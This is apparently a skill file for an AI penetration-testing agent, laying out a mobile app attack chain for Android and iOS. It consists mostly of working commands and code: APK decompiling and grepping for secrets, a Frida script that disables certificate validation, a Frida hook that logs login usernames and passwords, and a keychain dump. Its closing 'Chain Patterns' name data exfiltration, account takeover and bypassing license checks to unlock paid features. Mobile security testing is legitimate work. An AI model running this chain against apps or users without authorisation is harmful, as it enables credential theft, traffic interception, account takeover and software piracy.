# Mobile API Security Skill

## Triggers
"mobile", "android", "ios", "apk", "ipa", "frida", "objection", "certificate pinning", "ssl pinning", "mobile api", "app security", "react native", "flutter"

## Overview
Mobile application security testing including APK/IPA analysis, API interception, certificate pinning bypass, and runtime manipulation.

## Prerequisitesites
- apktool
- jadx / jadx-gui
- frida / frida-tools
- objection
- mobsf (Mobile Security Framework)
- burp suite / mitmproxy
- android sdk / adb

## Attack Chain

### Phase 1: APK Analysis
```bash
# Decompile
apktool d app.apk -o output_dir

# Java decompile
jadx app.apk -d jadx_output

# Manifest analysis
aapt dump badging app.apk
aapt dump xmltree app.apk AndroidManifest.xml

# Certificate info
keytool -printcert -jarfile app.apk
```

### Phase 2: Static Analysis
```bash
# Find API endpoints
grep -r "https://" output_dir/ | grep -v ".smali"
strings output_dir/lib/*.so | grep -E "https?://"

# Find hardcoded secrets
grep -r "api_key\|apikey\|secret\|password\|token" output_dir/
grep -r "AIza\|sk_live\|AKIA\|xox[baprs]" output_dir/

# Find crypto keys
grep -r "AES\|RSA\|DES\|key\|iv" output_dir/

# Check for debuggable
aapt dump badging app.apk | grep debuggable

# Check for backup allowed
aapt dump badging app.apk | grep allowBackup
```

### Phase 3: Dynamic Analysis
```bash
# Install and run
adb install app.apk
adb shell am start -n com.target.app/.MainActivity

# Frida hooks
frida -U -f com.target.app -l hooks.js --no-pause

# Objection exploration
objection -g com.target.app explore

# SSL pinning bypass
objection -g com.target.app explore --startup-command 'android sslpinning disable'
```

### Phase 4: Certificate Pinning Bypass
```javascript
// frida-ssl-pinning-bypass.js
Java.perform(function() {
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManager = Java.registerClass({
        name: 'com.custom.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
    var SSLContextInstance = SSLContext.getInstance('TLS');
    SSLContextInstance.init(null, TrustManagers, null);
    SSLContext.setDefault(SSLContextInstance);
});
```

### Phase 5: API Interception
```bash
# Proxy setup
adb shell settings put global http_proxy 192.168.1.100:8080

# Burp CA install
adb push burp-ca-cert.pem /sdcard/
# Install via Settings > Security > Install from storage

# mitmproxy
mitmproxy -p 8080 --mode transparent

# Capture API calls
mitmproxy -p 8080 -w capture.flow
```

### Phase 6: Runtime Manipulation
```javascript
// frida-runtime-hooks.js
Java.perform(function() {
    // Hook login
    var Login = Java.use('com.target.app.LoginActivity');
    Login.login.implementation = function(username, password) {
        console.log("[*] Username: " + username);
        console.log("[*] Password: " + password);
        this.login(username, password);
    };
    
    // Hook API calls
    var ApiClient = Java.use('com.target.app.ApiClient');
    ApiClient.request.implementation = function(url, data) {
        console.log("[*] URL: " + url);
        console.log("[*] Data: " + data);
        return this.request(url, data);
    };
});
```

### Phase 7: IPA Analysis (iOS)
```bash
# Unzip IPA
unzip app.ipa -d ipa_output

# Plist analysis
plutil -p ipa_output/Payload/App.app/Info.plist

# Class dump
class-dump ipa_output/Payload/App.app/App

# Keychain dump
keychain-dumper

# Runtime analysis
frida -U -f com.target.app -l ios-hooks.js
```

## Chain Patterns
- APK decompile → hardcoded API key → abuse API → data exfil
- SSL pinning bypass → MITM → API abuse → account takeover
- Frida hook → bypass auth → access premium features
- Runtime manipulation → bypass license check → unlock paid
- Backup enabled → adb pull → extract data → credentials
